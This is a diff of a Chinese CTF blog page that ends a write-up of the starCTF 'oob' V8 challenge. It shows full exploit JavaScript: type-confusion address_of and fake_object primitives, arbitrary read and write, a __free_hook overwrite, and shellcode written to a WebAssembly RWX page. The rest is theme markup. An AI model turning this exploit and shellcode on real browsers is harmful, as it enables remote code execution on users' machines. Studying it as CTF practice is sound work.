libc_base = free_addr - <span class="number">0x9a6d0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;libc_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> __free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x52290n</span>;</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, system_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;gnome-calculator\x00&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwn()</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230627183627029.png"
-                      alt="image-20230627183627029"
-                ></p>
+<p><img   src="/images/image-20230627183627029.png"  alt="image-20230627183627029"></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span> + (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>, <span class="number">0x62792eb848500101n</span>, <span class="number">0x431480101626d60n</span>, <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>, <span class="number">0x1010101010101b8n</span>, <span class="number">0x6d606279b8485001n</span>, <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>, <span class="number">0x313b68e6894856e6n</span>, <span class="number">0x101012434810101n</span>, <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>, <span class="number">0x894852e201485a08n</span>, <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(sc_arr.length * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">        data_view.setFloat64(i * <span class="number">8</span>, i2f(value[i]), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> pwn = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pwn_addr = address_of(pwn);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;pwn_addr =&gt; 0x&quot;</span> + pwn_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbitrary_read(pwn_addr - <span class="number">1n</span> + <span class="number">0x18n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;shared_info_addr =&gt; 0x&quot;</span> + shared_info_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> data_addr = arbitrary_read(shared_info_addr - <span class="number">1n</span> + <span class="number">0x8n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;data_addr =&gt; 0x&quot;</span> + data_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> instance_addr = arbitrary_read(data_addr - <span class="number">1n</span> + <span class="number">0x10n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;instance_addr =&gt; 0x&quot;</span> + instance_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> rwx_addr = arbitrary_read(instance_addr - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;rwx_addr =&gt; 0x&quot;</span> + rwx_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line">arbitrary_write(rwx_addr, sc_arr);</span><br><span class="line"></span><br><span class="line">pwn();</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230627195354273.png"
-                      alt="image-20230627195354273"
-                ></p>
+<p><img   src="/images/image-20230627195354273.png"  alt="image-20230627195354273"></p>
 
-        </div>
+                    
+                </div>
 
-        
-
-        
-            <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2023/07/28/dl-runtime-resolve/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">dl-runtime-resolve重温</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/overstep/">overstep</a>
+                                    </li>
+                                
+                            </ul>
+                        
                     </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2023/05/30/protobuf/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">关于protobuf的解题步骤</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
+                    <div>
+                        
                     </div>
-                
-            </div>
-        
+                </div>
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/reward.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="fa-solid fa-mug-hot"></i>&nbsp;激励牛马，加速创作！
     </div>
-    
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/07/28/dl-runtime-resolve/"
+                                   title="dl-runtime-resolve重温"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">dl-runtime-resolve重温</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/05/30/protobuf/"
+                                   title="关于protobuf的解题步骤"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">关于protobuf的解题步骤</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
 
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+              appKey: 'C672AAYGXMkHxztf8ntdLShs',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '😜若有问题请各位大师傅留言评论',
+              lang: 'zh-CN'.toLowerCase()
             }
 
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
             } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
             }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
         </script>
     </div>
 
 
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
 
         
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#starCTF-oob"><span class="nav-text">starCTF oob</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="nav-text">小总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B3%84%E6%BC%8Fmap%E5%9C%B0%E5%9D%80"><span class="nav-text">1. 泄漏map地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E8%8E%B7%E5%8F%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E5%9C%B0%E5%9D%80"><span class="nav-text">2. 类型混淆获取任意对象地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%AE%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%BD%93%E4%BD%9C%E5%AF%B9%E8%B1%A1"><span class="nav-text">3. 讲任意地址当作对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%8F%96"><span class="nav-text">4. 实现任意地址读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-text">5. 实现任意地址写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8-%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F"><span class="nav-text">最终利用: 传统方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8-%E9%9D%9E%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F"><span class="nav-text">最终利用: 非传统方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88exp"><span class="nav-text">最终exp</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
     
-</div>
-
-            </div>
         
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
+        <div class="deploy-info info-item">
             
-              <span>2021</span>&nbsp;-&nbsp;
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
             
-            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
         </div>
-        
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">335.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
         </div>
-        
-    </div>
+    
+
+    
 </footer>
 
         </div>
     </div>
 
+    <!-- post tools -->
     
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
-        <!-- go comment -->
+        <!-- PC go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
         </div>
     
 
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
         </li>
@@ -529,13 +672,12 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
@@ -549,42 +691,45 @@
             </li>
         
 
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
     </ul>
 
-    <ul class="exposed-tools-list">
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
-        
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
     </ul>
 </div>
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#starCTF-oob"><span class="nav-text">starCTF oob</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="nav-text">小总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B3%84%E6%BC%8Fmap%E5%9C%B0%E5%9D%80"><span class="nav-text">1. 泄漏map地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E8%8E%B7%E5%8F%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E5%9C%B0%E5%9D%80"><span class="nav-text">2. 类型混淆获取任意对象地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%AE%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%BD%93%E4%BD%9C%E5%AF%B9%E8%B1%A1"><span class="nav-text">3. 讲任意地址当作对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%8F%96"><span class="nav-text">4. 实现任意地址读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-text">5. 实现任意地址写</span></a></li><li 